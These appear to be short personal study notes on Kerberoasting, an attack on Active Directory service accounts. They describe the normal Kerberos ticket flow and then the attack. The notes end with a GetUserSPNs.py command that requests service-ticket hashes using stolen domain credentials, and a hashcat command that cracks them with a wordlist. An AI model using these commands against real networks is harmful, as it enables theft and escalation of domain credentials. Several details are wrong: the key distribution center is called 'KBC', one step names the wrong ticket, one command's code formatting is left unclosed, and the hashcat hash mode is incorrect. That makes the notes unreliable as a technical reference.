## Kerberoasting Overview
- Very popular attack and a quick way to get DA in a network
- Goal: Get TGS and decrypt server's account hash
- Takes advantage of service accounts
- We set up a SQL service account
- SPN = service principal name

### Legitimate Process
- We want to access an application server
- To do that we must request some thing from the KBC (key distribution center)

1. User requests TGT (ticket granting ticket) from KBC by providing NTLM hash
2. User receives TGT encrypted with KRBTGT hash from KBC
3. User requests TGS (service ticket) for server from KBC by providing TGS
4. User receives TGS encrypted with server's account hash
5. User presents TGS to application server

### Attack
- When we compromise a domain account, we can get a valid TGT
- Then we can request a TGS to get the hash of the services account
- Get SPNs: `python GetUserSPNs.py <domain>/<username>:<password> -dc-ip <DC IP> -request
- Crack hash: `hashcat -m 1300 kerberoast.txt rockyou.txt`
